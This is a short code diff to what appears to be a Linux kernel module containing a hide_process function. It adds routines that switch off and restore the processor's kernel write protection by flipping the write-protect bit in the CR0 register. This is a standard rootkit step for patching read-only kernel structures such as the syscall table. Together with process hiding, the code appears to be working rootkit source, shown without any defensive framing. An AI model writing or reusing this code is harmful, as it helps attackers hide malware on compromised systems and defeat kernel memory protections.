@@ -35,6 +35,34 @@ int hide_process(struct task_struct *task) {
 	return 1;
 }
 
+/*
+ * Disable the writing protection for the whole processor.
+ */
+static void disable_page_protection (void)
+{
+	unsigned long value;
+	asm volatile("mov %%cr0,%0" : "=r" (value));
+	if (value & 0x00010000)
+	{
+		value &= ~0x00010000;
+		asm volatile("mov %0,%%cr0": : "r" (value));
+	}
+}
+
+/*
+ * Reenable the writing protection for the whole processor.
+ */
+static void enable_page_protection (void)
+{
+	unsigned long value;
+	asm volatile("mov %%cr0,%0" : "=r" (value));
+	if (!(value & 0x00010000))
+	{
+		value |= 0x00010000;
+		asm volatile("mov %0,%%cr0": : "r" (value));
+    	}
+}
+
 int get_tasks (pid_t *pids, struct task_struct **tasks, int size) 
 {
 	struct task_struct *task;
